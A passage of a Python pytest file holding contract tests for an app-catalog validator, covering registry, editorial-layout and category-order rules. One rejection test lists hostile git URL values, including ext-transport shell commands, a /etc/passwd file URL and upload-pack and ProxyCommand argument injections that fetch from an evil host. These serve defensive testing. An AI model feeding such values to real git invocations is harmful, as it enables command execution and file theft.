"""Contract tests: prove the gate REJECTS what it is supposed to reject.

A validator that only ever runs against a valid catalog tells you nothing --
it would pass just as happily with every check deleted. So each case below is
a mistake someone could plausibly make, paired with the specific reason the
contract refuses it. The accept cases exist to keep the gate from becoming so
strict that legitimate input fails.

Run: pytest tests/ -q
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

from validate import validate  # noqa: E402

SCHEMA_DIR = ROOT / "schema"


def write_docs(
    tmp_path: Path, registry: dict, editorial: dict, order: dict | None = None
) -> tuple[Path, Path, Path]:
    """Write the three authored documents and return their paths.

    `order` defaults to a valid empty rail so a test about the registry or the
    featured layout does not have to know this document exists. A test that IS
    about the rail passes one.
    """
    reg = tmp_path / "official-registry.json"
    ed = tmp_path / "editorial.json"
    co = tmp_path / "category-order.json"
    reg.write_text(json.dumps(registry), encoding="utf-8")
    ed.write_text(json.dumps(editorial), encoding="utf-8")
    co.write_text(json.dumps(order if order is not None else base_order()), encoding="utf-8")
    return reg, ed, co


def base_order(*ids: str) -> dict:
    """A rail-order document. Order is array position, so the args ARE the order.

    The schema requires at least one id, so an "empty" rail is spelled with a
    single placeholder rather than `[]` -- a rail with no categories at all is
    not a state the store can be in, since every app either names a category or
    falls into the default bucket.
    """
    return {"schemaVersion": 1, "categories": list(ids) or ["other"]}


def app(name: str = "demo-app", ref: str = "main", categories=None) -> dict:
    entry = {"name": name, "source": {"type": "git", "url": "https://example.com/a.git", "ref": ref}}
    if categories is not None:
        entry["categories"] = categories
    return entry


def base_registry(*apps: dict, **extra) -> dict:
    return {"schemaVersion": 1, "apps": list(apps), **extra}


def base_editorial(**extra) -> dict:
    return {"schemaVersion": 1, **extra}


def full(*items: dict) -> dict:
    """A `full` section. Takes *items so a wrong count can still be asserted on."""
    return {"form": "full", "items": list(items)}


def row(*items: dict) -> dict:
    return {"form": "row", "items": list(items)}


def errors_for(
    tmp_path: Path, registry: dict, editorial: dict, order: dict | None = None
) -> list[str]:
    reg, ed, co = write_docs(tmp_path, registry, editorial, order)
    return validate(reg, ed, co).errors


# --------------------------------------------------------------------------
# Accept: legitimate input must not be rejected.
# --------------------------------------------------------------------------


def test_accepts_empty_catalog(tmp_path):
    """The catalog starts empty. An empty registry is publishable, not an error."""
    assert errors_for(tmp_path, base_registry(), base_editorial()) == []


def test_accepts_branch_ref_in_authored_input(tmp_path):
    """A curator writes a branch; pinning to a commit is the pipeline's job."""
    assert errors_for(tmp_path, base_registry(app(ref="main")), base_editorial()) == []


def test_accepts_app_with_category_membership(tmp_path):
    registry = base_registry(app("demo-app"))
    editorial = base_editorial(sections=[full({"type": "app", "appRef": "demo-app"})])
    order = base_order("developer-tools")
    assert errors_for(tmp_path, registry, editorial, order) == []


def test_accepts_same_app_in_category_and_section(tmp_path):
    """A rail is how an app appears twice WITHOUT a second category."""
    registry = base_registry(app("demo-app", categories=["productivity"]))
    editorial = base_editorial(sections=[full({"type": "app", "appRef": "demo-app"})])
    order = base_order("productivity")
    assert errors_for(tmp_path, registry, editorial, order) == []


def test_uncategorized_app_warns_but_does_not_fail(tmp_path):
    """An app in no category lands in the default bucket; it is never hidden."""
    reg, ed, co = write_docs(tmp_path, base_registry(app("demo-app")), base_editorial())
    findings = validate(reg, ed, co)
    assert findings.ok
    assert any("default bucket" in w for w in findings.warnings)


# --------------------------------------------------------------------------
# Reject: authored input must not carry generated or moved-out fields.
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "field,value",
    [
        ("displayName", "Demo"),   # generated from app.json at publish
        ("summary", "A demo"),     # generated
        ("tags", ["dev"]),         # generated
        ("searchAliases", ["d"]),  # generated
        ("version", "1.0.0"),      # generated
        ("category", "dev-tools"), # moved to editorial.json
        ("resources", {"cpu": 1}), # moved to app.json
        ("lifecycle", {"a": 1}),   # moved to app.json
        ("detectInstalled", "x"),  # moved to app.json (now platform.externalInstall)
        ("delegates", []),         # removed entirely: a fetched doc adds no fetch targets
    ],
)
def test_rejects_field_that_is_not_curator_authored(tmp_path, field, value):
    entry = app()
    entry[field] = value
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_accepts_curator_stated_author(tmp_path):
    """`author` is the deliberate exception to "everything displayed is generated".

    It is an assertion about provenance rather than a description of the app, and
    this document is signed by us -- so a manifest's self-claim cannot be the
    last word on it. Withholding it from the curator protected nothing anyway:
    whoever edits this file holds the signing key.
    """
    entry = app()
    entry["author"] = {"name": "LaunchDarkly Labs", "kind": "org"}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) == []


@pytest.mark.parametrize(
    "value",
    [
        "LaunchDarkly Labs",              # bare string: the published shape is an object
        {},                               # name is required
        {"name": ""},                     # empty name
        {"name": "x", "url": "http://a"}, # https only
        {"name": "x", "kind": "robot"},   # person | org
        {"name": "x", "email": "a@b.c"},  # additionalProperties: false
    ],
)
def test_rejects_a_malformed_curator_author(tmp_path, value):
    entry = app()
    entry["author"] = value
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_rejects_traversing_app_name(tmp_path):
    """A name reaches a filesystem path; '../' must never survive validation."""
    assert errors_for(tmp_path, base_registry(app("../evil")), base_editorial()) != []


def test_rejects_unknown_source_type(tmp_path):
    """Only git is implemented in v1; an unknown transport fails closed."""
    entry = {"name": "demo-app", "source": {"type": "ftp", "url": "ftp://x/a"}}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_rejects_duplicate_app_name(tmp_path):
    """Two entries with one name make the winning source depend on merge order."""
    assert errors_for(tmp_path, base_registry(app("demo-app"), app("demo-app")), base_editorial()) != []


# --------------------------------------------------------------------------
# Reject: cross-document invariants.
# --------------------------------------------------------------------------


def test_rejects_dangling_app_ref(tmp_path):
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "ghost-app"})]
    )
    assert any("not declared" in e for e in errors_for(tmp_path, base_registry(), editorial))


def test_rejects_collection_with_a_multiline_title(tmp_path):
    """A theme is ONE line of prose.

    HTML collapses a newline to a space, so a multi-line title would validate,
    sign, and then render as something other than what was authored -- and the
    part after the break is invisible to anyone reading the source document as
    lines.

    A TRAILING newline is included deliberately, and it is the case a naively
    anchored pattern gets wrong: this repository validates through Python, where
    `$` means end-of-input OR just before a trailing newline, so `"Theme\\n"`
    satisfies `^[^\\r\\n]*\\S[^\\r\\n]*$` here while failing it under ECMA-262.
    The constraint survives that difference by keeping `[\\s\\S]*` shoulders, so
    it asserts containment rather than shape.
    """
    registry = base_registry(app("demo-app"), app("other-app"))
    for title in ("Ship it\nbefore lunch", "Theme\r\nmore", "ok\n\n\nmore", "Theme\n", "Theme\r\n", "\nTheme"):
        editorial = base_editorial(
            sections=[
                full({"type": "collection", "title": title, "appRefs": ["demo-app", "other-app"]})
            ]
        )
        assert errors_for(tmp_path, registry, editorial) != [], repr(title)


def test_accepts_a_title_with_internal_spaces_and_punctuation(tmp_path):
    """The anchoring must not cost a normal title.

    Guards against the tempting `^\\S+$` spelling, which rejects every title
    containing a space -- including this schema's own example.
    """
    registry = base_registry(app("demo-app"), app("other-app"))
    for title in ("Ship it before lunch", "On-call & Ops essentials", "Research + writing"):
        editorial = base_editorial(
            sections=[
                full({"type": "collection", "title": title, "appRefs": ["demo-app", "other-app"]})
            ]
        )
        assert errors_for(tmp_path, registry, editorial) == [], repr(title)


def test_rejects_collection_with_a_whitespace_only_title(tmp_path):
    """`minLength: 1` counts bytes; the client counts visible characters.

    A `" "` title would pass a byte-length check, survive every cross-document
    check (none of them look at titles), publish -- and then be dropped by the
    client as unusable. The card would vanish with no error at the gate and
    nothing in the client's log, which is the exact failure the section
    description warns about. So the gate refuses it here instead.
    """
    registry = base_registry(app("demo-app"), app("other-app"))
    for title in (" ", "\t", "\n  "):
        editorial = base_editorial(
            sections=[
                full({"type": "collection", "title": title, "appRefs": ["demo-app", "other-app"]})
            ]
        )
        assert errors_for(tmp_path, registry, editorial) != [], repr(title)


def test_rejects_collection_without_a_title(tmp_path):
    """The theme is the whole reason unrelated apps share a card. Without it a
    reader has no way to tell why, so an untitled collection is unrepresentable
    rather than merely discouraged."""
    editorial = base_editorial(
        sections=[{"type": "collection", "appRefs": ["demo-app", "other-app"]}]
    )
    registry = base_registry(app("demo-app"), app("other-app"))
    assert errors_for(tmp_path, registry, editorial) != []


def test_rejects_a_full_section_holding_more_than_one_item(tmp_path):
    """`full` means one item across the whole width. Two of them can only stack,
    and stacked full-width blocks are two sections -- so a two-item `full` is a
    document saying something the form cannot mean."""
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"}, {"type": "app", "appRef": "other-app"})]
    )
    registry = base_registry(app("demo-app"), app("other-app"))
    assert errors_for(tmp_path, registry, editorial) != []


def test_rejects_a_section_with_no_items(tmp_path):
    """An empty block occupies page height and says nothing. Every form requires
    at least one item, so this is caught by the form rather than by the client
    quietly rendering a gap."""
    for form in ("full", "row", "carousel"):
        editorial = base_editorial(sections=[{"form": form, "items": []}])
        assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != [], form


def test_rejects_a_row_of_one(tmp_path):
    """A row of one renders as a half-width card against empty space. The curator
    who wants a single item featured means `full`, which is a statement that it
    deserves the width -- the two are not interchangeable."""
    editorial = base_editorial(sections=[row({"type": "app", "appRef": "demo-app"})])
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_an_unknown_form(tmp_path):
    """The publish gate is closed on forms even though the CLIENT skips them.

    Tolerance at the reader is what lets a new form ship before every client can
    draw it; tolerance at the GATE would let a typo publish as an invisible
    block, which reads to the curator as the store losing their work.
    """
    editorial = base_editorial(
        sections=[{"form": "grid", "items": [{"type": "app", "appRef": "demo-app"}]}]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_a_section_carrying_artwork_at_its_own_level(tmp_path):
    """Artwork belongs to an item, not to the block that arranges items.

    A section is closed (`additionalProperties: false`), so artwork written one
    level too high is refused instead of silently ignored -- otherwise the
    curator's image would validate, publish, and never render.
    """
    editorial = base_editorial(
        sections=[
            {
                "form": "full",
                "items": [{"type": "app", "appRef": "demo-app"}],
                "artwork": {"ref": "art/hero.png"},
            }
        ]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_accepts_the_one_plus_two_layout(tmp_path):
    """The layout this shape exists to express: one full-width block, then a row
    of two. Two sections, not three cards -- the grouping is in the document
    rather than inferred from array position by the client."""
    registry = base_registry(app("demo-app"), app("other-app"), app("third-app"))
    editorial = base_editorial(
        sections=[
            full({"type": "app", "appRef": "demo-app"}),
            row(
                {"type": "collection", "title": "Pair one", "appRefs": ["other-app", "third-app"]},
                {"type": "collection", "title": "Pair two", "appRefs": ["demo-app", "other-app"]},
            ),
        ]
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_rejects_collection_of_one(tmp_path):
    """A one-app collection is an `app` placement wearing a costume. Allowing it
    would give two spellings for the same card and no reason to prefer either."""
    editorial = base_editorial(
        sections=[{"type": "collection", "title": "Picks", "appRefs": ["demo-app"]}]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_app_section_carrying_a_title(tmp_path):
    """A single-app card is headed by the app's own name. A curator who wants
    different words is describing a collection, so `title` here is refused
    instead of being silently ignored by the renderer."""
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app", "title": "Our pick"})]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_app_section_with_no_ref_at_all(tmp_path):
    """`appRef` is required, and this is the payload that proves it.

    Isolated on purpose: a section carrying `appRefs` instead would be refused by
    `additionalProperties` whether or not `appRef` were required, so it could not
    tell the two constraints apart.
    """
    editorial = base_editorial(sections=[full({"type": "app"})])
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_app_section_with_a_ref_list(tmp_path):
    """`appRefs` on an `app` section is the retired shape. Refusing it means a
    stale hand-edit fails at publish rather than publishing a card with no app.

    A VALID `appRef` sits beside it, so the only remaining reason to refuse is
    the retired key itself -- otherwise this would pass on the missing-`appRef`
    error and never exercise `additionalProperties`.
    """
    editorial = base_editorial(
        sections=[{"type": "app", "appRef": "demo-app", "appRefs": ["demo-app"]}]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


def test_rejects_collection_larger_than_the_card_can_draw(tmp_path):
    """Every member is rendered -- there is no collection detail page to hold an
    overflow. A cap above what the card draws would silently discard members
    that validated and published."""
    names = [f"app-{i}" for i in range(7)]
    editorial = base_editorial(
        sections=[full({"type": "collection", "title": "Too many", "appRefs": names})]
    )
    assert errors_for(tmp_path, base_registry(*(app(n) for n in names)), editorial) != []


def test_rejects_retired_section_types(tmp_path):
    """`rail` and `banner` were schema entries with no renderer, so a published
    one vanished into the reader's skip path and looked like a bug. They are
    gone; a document still using them fails the gate."""
    for retired in (
        {"type": "rail", "title": "Staff picks", "appRefs": ["demo-app"]},
        {"type": "banner", "md": "New this week"},
    ):
        editorial = base_editorial(sections=[full(retired)])
        assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != [], retired


def test_accepts_a_collection_of_two(tmp_path):
    """The smallest legitimate collection. Guards the minItems boundary from
    being raised past what curators actually author."""
    registry = base_registry(app("demo-app"), app("other-app"))
    editorial = base_editorial(
        sections=[
            full(
                {
                    "type": "collection",
                    "title": "Ship it before lunch",
                    "appRefs": ["demo-app", "other-app"],
                    "blurb": "Two tools, one afternoon.",
                }
            )
        ]
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_accepts_a_secondary_category_but_says_it_does_not_place_the_app(tmp_path):
    """Primary decides the rail, so the rails stay a partition; a second entry
    only widens search. Silently accepting it would leave a curator thinking the
    app appears in two rails."""
    registry = base_registry(app("demo-app", categories=["dev", "ops"]))
    reg, ed, co = write_docs(
        tmp_path, registry, base_editorial(), base_order("dev", "ops")
    )
    findings = validate(reg, ed, co)
    assert findings.errors == []
    assert any("primary category is 'dev'" in w for w in findings.warnings), findings.warnings


def test_rejects_a_third_category(tmp_path):
    """Capped at two, or 'which rail does this land in' stops having an answer."""
    registry = base_registry(app("demo-app", categories=["dev", "ops", "other"]))
    order = base_order("dev", "ops", "other")
    assert errors_for(tmp_path, registry, base_editorial(), order) != []


def test_rejects_the_same_category_listed_twice(tmp_path):
    """"in categories 'a' and 'a'" reads as nonsense; uniqueItems refuses it."""
    registry = base_registry(app("demo-app", categories=["dev", "dev"]))
    assert errors_for(tmp_path, registry, base_editorial(), base_order("dev")) != []


def test_rejects_a_category_not_declared_in_the_order_document(tmp_path):
    """The vocabulary has one home. A schema cannot check another document, so an
    id that exists nowhere has to be caught here or it reaches a client."""
    registry = base_registry(app("demo-app", categories=["invented"]))
    errors = errors_for(tmp_path, registry, base_editorial(), base_order("dev"))
    assert any("not declared in category-order.json" in e for e in errors), errors


def test_editorial_refuses_a_categories_key(tmp_path):
    """The rail order moved out, and `additionalProperties: false` is what makes
    that a refusal rather than a silent no-op.

    Without this, a curator editing the old shape would get a green gate and a
    published document whose categories nothing reads -- the same failure mode as
    the `label` field this split deleted, which validated and published for
    months while the client used its own compiled copy.
    """
    editorial = {
        "schemaVersion": 1,
        "categories": [{"id": "dev", "label": "Dev", "order": 10}],
    }
    assert errors_for(tmp_path, base_registry(), editorial) != []


def test_the_three_documents_are_validated_independently(tmp_path):
    """Each document is held to its own schema, so one bad file names itself.

    The point of the split is that a bump to one contract does not reach the
    others; a shared verdict would undo that at the gate even though the client
    keeps them separate.
    """
    bad_order = {"schemaVersion": 1, "categories": ["Not A Valid Id"]}
    errors = errors_for(tmp_path, base_registry(), base_editorial(), bad_order)
    assert any(e.startswith("category-order:") for e in errors), errors
    assert not any(e.startswith("editorial:") for e in errors), errors


def test_rejects_the_same_category_declared_twice(tmp_path):
    """Two entries sharing an id make membership ambiguous.

    Found by mutation testing when this was a cross-document check over a list
    of objects: it could be deleted with the suite still green. It is now
    `uniqueItems` on a list of strings, so the schema refuses it -- kept as a
    test because the reason to refuse it did not go away with the mechanism.
    """
    order = {"schemaVersion": 1, "categories": ["dev", "dev"]}
    assert errors_for(tmp_path, base_registry(), base_editorial(), order) != []


def test_rail_sequence_is_array_position(tmp_path):
    """Two categories may not carry a rank, because there is no rank to carry.

    The numeric `order` this replaced needed two invariants of its own -- ranks
    unique, and a tie-break for equal ranks -- and bought nothing an array does
    not already give. A document still carrying one is refused rather than
    silently ignored, so a curator who writes the old shape is told.
    """
    order = {"schemaVersion": 1, "categories": [{"id": "dev", "order": 10}]}
    assert errors_for(tmp_path, base_registry(), base_editorial(), order) != []


def test_rejects_reference_to_tombstoned_app(tmp_path):
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-01-01"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_rejects_reinstatement_without_tombstone(tmp_path):
    """Silent no-op otherwise: nothing would signal the name was wrong."""
    registry = base_registry(app("demo-app"), reinstated=[{"name": "demo-app", "since": "2026-01-01"}])
    assert any("no matching tombstone" in e for e in errors_for(tmp_path, registry, base_editorial()))


def test_reinstated_app_may_be_referenced_again(tmp_path):
    """A newer reinstatement clears the tombstone, so the app is live again.

    Both lists are append-only history, so the removal record legitimately
    remains; treating `removed` as the answer would keep the app dead forever.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-01-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-06-01"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_removal_newer_than_reinstatement_still_tombstoned(tmp_path):
    """Removed again after a reinstatement: the newest record wins."""
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-06-01"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_same_day_reinstatement_fails_closed(tmp_path):
    """An ambiguous same-day pair keeps the app removed.

    The removal may exist because the app was pulled for cause, so the safe
    reading of a tie is 'still removed'.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-07-01"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_rejects_a_section_carrying_an_arbitrary_url(tmp_path):
    """No section variant accepts a URL any more.

    `banner` was the only one that did, through `cta.href` with an `^https://`
    pattern, and it is gone. This asserts the property that replaced that gate --
    a curated feed cannot point the client anywhere at all, because no surviving
    variant has a field for it -- rather than leaving behind a test that names
    URL-scheme coverage the schema no longer contains.
    """
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app", "cta": {"href": "https://ok.example"}})]
    )
    assert errors_for(tmp_path, base_registry(app("demo-app")), editorial) != []


# --------------------------------------------------------------------------
# The published wire schema is stricter than the authored one.
# --------------------------------------------------------------------------


def published_errors(doc: dict) -> list[str]:
    from jsonschema import Draft202012Validator

    schema = json.loads((SCHEMA_DIR / "official-registry.schema.json").read_text())
    return [e.message for e in Draft202012Validator(schema).iter_errors(doc)]


def test_published_schema_rejects_mutable_ref():
    """A signed index naming 'main' signs nothing about the bytes."""
    assert published_errors({"schemaVersion": 1, "apps": [app(ref="main")]}) != []


def test_published_schema_accepts_commit_ref():
    assert published_errors({"schemaVersion": 1, "apps": [app(ref="a" * 40)]}) == []


def test_published_schema_rejects_bare_string_author():
    """author is a struct; a bare string cannot carry a URL or person/org kind."""
    entry = app(ref="a" * 40)
    entry["author"] = "kirocrew"
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_digestless_archive():
    """An archive with no digest is an unpinned download."""
    entry = {"name": "demo-app", "source": {"type": "archive", "url": "https://x/a.tgz"}}
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_mixed_source_variants():
    entry = {
        "name": "demo-app",
        "source": {"type": "git", "url": "https://x/a.git", "ref": "a" * 40, "sha256": "b" * 64},
    }
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


# --------------------------------------------------------------------------
# Regressions found while self-reviewing this contract. Each of these passed
# schema validation at some point and was still wrong.
# --------------------------------------------------------------------------


def test_rejects_non_iso_tombstone_date(tmp_path):
    """`format` is only checked when a FormatChecker is wired in.

    Without one, jsonschema treats `format` as an annotation and "NOT-A-DATE"
    validates cleanly -- then flows into date comparison.

    Asserts the SCHEMA-layer message specifically. A bare `errors != []` would
    pass even with the format checker removed, because the cross-document layer
    catches the same bad date independently -- so the weaker assertion cannot
    tell which layer fired, and the format wiring could be deleted unnoticed.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "NOT-A-DATE"}],
    )
    errors = errors_for(tmp_path, registry, base_editorial())
    assert any("is not a 'date'" in e for e in errors), (
        f"expected a schema-level date format error; got {errors}"
    )


def test_bogus_reinstatement_date_is_rejected(tmp_path):
    """Regression: a lexical string compare let "9999-99-99" outrank any real date.

    That turned an unparseable value into a way to resurrect an app pulled for
    being malicious. Now the schema's date format check rejects the document
    outright, so it never reaches resolution at all.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "9999-99-99"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    assert errors_for(tmp_path, registry, editorial) != []


def test_cross_document_layer_fails_closed_on_a_bogus_date():
    """Defense in depth for the same bug, one layer down.

    check_cross_document is reachable without the schema gate (the examples
    test calls it directly, and a future schema loosening would expose it), so
    it must not depend on the schema having already screened the input: an
    unparseable date is an error AND leaves the app tombstoned.
    """
    from validate import Findings, check_cross_document

    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "9999-99-99"}],
    )
    editorial = base_editorial(
        sections=[full({"type": "app", "appRef": "demo-app"})]
    )
    findings = Findings()
    check_cross_document(registry, editorial, base_order(), findings)

    assert any("invalid 'since'" in e for e in findings.errors)
    # The important half: the app must not have gone live.
    assert any("tombstoned" in e for e in findings.errors)


def test_format_checkers_for_every_format_we_use_are_active():
    """Guard against a silently weaker gate.

    `date-time` and `uri` need jsonschema's [format] extra. If the extra is
    ever dropped from requirements, those checks vanish with no error and the
    suite would otherwise stay green while enforcing less.
    """
    import re

    from jsonschema import FormatChecker

    used = set()
    for schema_file in SCHEMA_DIR.glob("*.json"):
        used |= set(re.findall(r'"format":\s*"([a-z0-9-]+)"', schema_file.read_text()))

    missing = sorted(used - set(FormatChecker().checkers))
    assert not missing, (
        f"schemas use format(s) {missing} that this environment does not check; "
        f"install jsonschema[format] (see tools/requirements.txt)"
    )

# --------------------------------------------------------------------------
# Review findings (buluoray, PR #1). Each of these validated cleanly before.
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c whoami",              # git's ext transport executes the command
        "file:///etc/passwd",             # reads an arbitrary local path
        "--upload-pack=/bin/sh",          # argument injection into the git invocation
        "-oProxyCommand=curl evil.sh",    # same, via a leading dash
        "git@github.com:acme/app.git",    # ssh: no tier supplies clone credentials
        "http://github.com/acme/app.git", # plaintext
        "https://exa mple.com/a.git",     # whitespace
    ],
)
def test_rejects_non_https_git_url(tmp_path, url):
    """A git URL is an execution vector once it reaches `git clone`.

    The schema's own preamble forbids carrying executable strings, so leaving
    this field at `minLength: 1` contradicted it -- and the trusted-host gate
    that was supposed to cover it lives in a client that does not exist yet.
    """
    entry = {"name": "demo-app", "source": {"type": "git", "url": url, "ref": "main"}}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != [], url


def test_published_schema_also_rejects_non_https_git_url():
    entry = {"name": "demo-app", "source": {"type": "git", "url": "ext::sh -c id", "ref": "a" * 40}}
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_bare_array():
    """The legacy bare-array branch was removed.

    It could not carry schemaVersion (so version gating was unenforceable) nor
    removed/reinstated (so tombstones silently did not exist in that shape), and
    it did not match any format that ever existed on disk anyway.
    """
    assert published_errors([]) != []
    assert published_errors([{"name": "demo-app", "source": {"type": "git", "url": "https://x/a.git", "ref": "a" * 40}}]) != []


def test_rejects_empty_subdir(tmp_path):
    """Omit the field rather than passing "" -- an empty segment is not a path."""
    entry = {
        "name": "demo-app",
        "source": {"type": "git", "url": "https://x/a.git", "ref": "main", "subdir": ""},
    }
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_duplicate_ref_in_one_collection_is_still_a_single_app(tmp_path):
    """A collection listing the same app twice is a curator slip, not two apps."""
    registry = base_registry(app("demo-app", categories=["dev"]))
    editorial = base_editorial(
        sections=[
            {"type": "collection", "title": "Picks", "appRefs": ["demo-app", "demo-app"]}
        ]
    )
    assert errors_for(tmp_path, registry, editorial, base_order("dev")) != []


def _strip_annotations(node):
    """Drop human-facing text so only the semantic shape is compared."""
    if isinstance(node, dict):
        return {
            k: _strip_annotations(v)
            for k, v in node.items()
            if k not in ("description", "title")
        }
    if isinstance(node, list):
        return [_strip_annotations(x) for x in node]
    return node


def test_shared_defs_stay_in_lockstep():
    """`tombstone`, `reinstatement` and `appName` are duplicated across both
    registry schemas. Nothing else pins them together, so extending an enum in
    one file only would let an authored document validate here and then be
    invalid as published output -- with no test turning red.
    """
    authored = json.loads((SCHEMA_DIR / "authored-registry.schema.json").read_text())["$defs"]
    published = json.loads((SCHEMA_DIR / "official-registry.schema.json").read_text())["$defs"]
    for shared in ("tombstone", "reinstatement", "appName"):
        assert _strip_annotations(authored[shared]) == _strip_annotations(published[shared]), (
            f"$defs/{shared} drifted between the authored and published schemas"
        )


# --------------------------------------------------------------------------
# The worked examples double as accept-path coverage. They are a matched pair
# (the editorial one references the registry one), so they also exercise the
# cross-document checks against a realistic non-empty catalog -- every other
# case above uses a two-line synthetic one.
# --------------------------------------------------------------------------

EXAMPLES = ROOT / "examples" / "accept"


def load_example(name: str) -> dict:
    return json.loads((EXAMPLES / name).read_text(encoding="utf-8"))


def test_published_example_is_valid():
    assert published_errors(load_example("official-registry.full.json")) == []


def test_editorial_example_is_valid():
    from jsonschema import Draft202012Validator

    schema = json.loads((SCHEMA_DIR / "editorial.schema.json").read_text())
    doc = load_example("editorial.full.json")
    assert [e.message for e in Draft202012Validator(schema).iter_errors(doc)] == []


def test_examples_are_mutually_consistent():
    """Every reference an example makes must resolve in the example it points at.

    Uses the cross-document checker directly: the published example carries
    generated fields, so it cannot go through validate(), which holds authored
    input to the stricter authored schema.
    """
    from validate import Findings, check_cross_document

    findings = Findings()
    check_cross_document(
        load_example("official-registry.full.json"),
        load_example("editorial.full.json"),
        load_example("category-order.full.json"),
        findings,
    )
    assert findings.errors == []


# --------------------------------------------------------------------------
# The builtin source type
#
# Every reject case here is a shape that would put a CLONE TARGET back into a
# built-in's published source -- the duplication the type exists to prevent. The
# variant closes `additionalProperties`, so these are unrepresentable rather than
# merely discouraged, and that is what these cases pin.
# --------------------------------------------------------------------------


def builtin(
    name: str = "demo-app",
    manifest_from: dict | None = None,
    categories=None,
    **source_extra,
) -> dict:
    source: dict = {"type": "builtin", **source_extra}
    if manifest_from is not None:
        source["manifestFrom"] = manifest_from
    else:
        source["manifestFrom"] = {
            "url": "https://github.com/kirodotdev/KiroCrew.git",
            "ref": "main",
            "subdir": "src/apps/builtins/demo_app",
        }
    entry = {"name": name, "source": source}
    entry["categories"] = categories if categories is not None else ["developer-tools"]
    return entry


def _order_with_developer_tools() -> dict:
    return base_order("developer-tools")


def test_accepts_a_builtin_entry(tmp_path):
    assert (
        errors_for(
            tmp_path,
            base_registry(builtin()),
            base_editorial(),
            _order_with_developer_tools(),
        )
        == []
    )


def test_accepts_a_builtin_without_minclientversion(tmp_path):
    """Optional on purpose: the earliest carrying release is often unknown, and
    stating an unverified one would tell a client that already HAS the app to
    update before it can use it."""
    entry = builtin()
    assert "minClientVersion" not in entry["source"]
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) == []


@pytest.mark.parametrize(
    "version",
    ["0.2.0", "0.2.0-nightly.20260806t065257", "0.2.0-rc.1", "1.0.0+build.5"],
)
def test_accepts_real_shipping_version_shapes(tmp_path, version):
    """Prereleases are real shipping versions: `0.2.0-nightly.20260806t065257` is
    the literal string the installed nightly carries. A release-only pattern
    would make the earliest carrying release unnameable for anything that first
    shipped on a nightly."""
    entry = builtin(minClientVersion=version)
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) == []


@pytest.mark.parametrize(
    "version",
    [
        "latest",
        "0.2",
        "v0.2.0",
        "",
        "0.2.0junk",
        "0.2.0 see evil.example",  # unanchored pattern would accept the suffix
    ],
)
def test_rejects_a_malformed_minclientversion(tmp_path, version):
    """The last two cases are what the `$` anchor buys: without it a trailing
    payload validates, gets signed, and renders. Both are under the 32-char cap,
    so each fails on the ANCHOR rather than on length."""
    entry = builtin(minClientVersion=version)
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


def test_rejects_a_builtin_carrying_a_top_level_url(tmp_path):
